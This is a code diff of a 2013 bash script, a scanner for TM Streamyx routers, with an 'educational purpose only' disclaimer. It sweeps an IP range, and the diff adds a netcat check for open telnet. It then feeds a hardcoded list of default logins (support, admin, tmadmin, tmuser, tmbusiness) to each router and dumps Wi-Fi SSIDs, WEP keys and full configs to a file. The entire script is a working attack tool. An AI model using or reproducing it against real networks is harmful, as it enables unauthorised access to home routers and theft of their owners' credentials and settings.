@@ -2,7 +2,6 @@
 # tm streamyx router scanner
 # test router default login and dump config
 # if telnet is accessible to public
-# similar tool / inspired by: https://github.com/shahril96/TM-Punk/
 # weldan <mweldan@gmail.com>, 2013
 # for educational purpose only  
 
@@ -26,62 +25,74 @@ then
     exit
 fi
 
+nc=$(which nc)
+if [ ! -f $nc ]
+then
+    clear
+    echo "netcat is required."
+    exit
+fi 
+
 ip=$1
 IFS=. read -a array <<< "$ip"
 for i in {1..254}
 do
-(
-echo open ${array[0]}.${array[1]}.${array[2]}.${i}
-sleep 2
-echo "support"
-sleep 1
-echo "support"
-sleep 1
-echo "support"
-sleep 1
-echo ""
-sleep 1
-echo "admin"
-sleep 1
-echo "tmadmin"
-sleep 1
-echo "tmadmin"
-sleep 1
-echo "admin"
-sleep 1
-echo "admin"
-sleep 1
-echo "admin"
-sleep 1
-echo "tmuser"
-sleep 1
-echo "tmuser"
-sleep 1
-echo "tmbusiness"
-sleep 1
-echo "tmbusiness"
-sleep 1
-echo "tmuser"
-sleep 1
-echo "tmbusiness"
-sleep 1
-echo "tmadmin"
-sleep 1
-echo "tmbusiness"
-sleep 1
-echo "wifissid"
-sleep 1
-echo ""
-echo "wifiwepkey"
-sleep 1
-echo ""
-echo "adslstat"
-sleep 1
-echo ""
-echo "dumpcfg"
-sleep 1
-echo ""
-echo "quit"
-sleep 1
-) | telnet >>./output.txt
+    currentip=${array[0]}.${array[1]}.${array[2]}.${i}
+    if ($nc -zw2 $currentip 23)
+    then
+        (
+        echo open $currentip
+        sleep 2
+        echo "support"
+        sleep 1
+        echo "support"
+        sleep 1
+        echo "support"
+        sleep 1
+        echo ""
+        sleep 1
+        echo "admin"
+        sleep 1
+        echo "tmadmin"
+        sleep 1
+        echo "tmadmin"
+        sleep 1
+        echo "admin"
+        sleep 1
+        echo "admin"
+        sleep 1
+        echo "admin"
+        sleep 1
+        echo "tmuser"
+        sleep 1
+        echo "tmuser"
+        sleep 1
+        echo "tmbusiness"
+        sleep 1
+        echo "tmbusiness"
+        sleep 1
+        echo "tmuser"
+        sleep 1
+        echo "tmbusiness"
+        sleep 1
+        echo "tmadmin"
+        sleep 1
+        echo "tmbusiness"
+        sleep 1
+        echo "wifissid"
+        sleep 1
+        echo ""
+        echo "wifiwepkey"
+        sleep 1
+        echo ""
+        echo "adslstat"
+        sleep 1
+        echo ""
+        echo "dumpcfg"
+        sleep 1
+        echo ""
+        echo "quit"
+        sleep 1   
+        ) | telnet >>./output.txt
+    fi 
 done
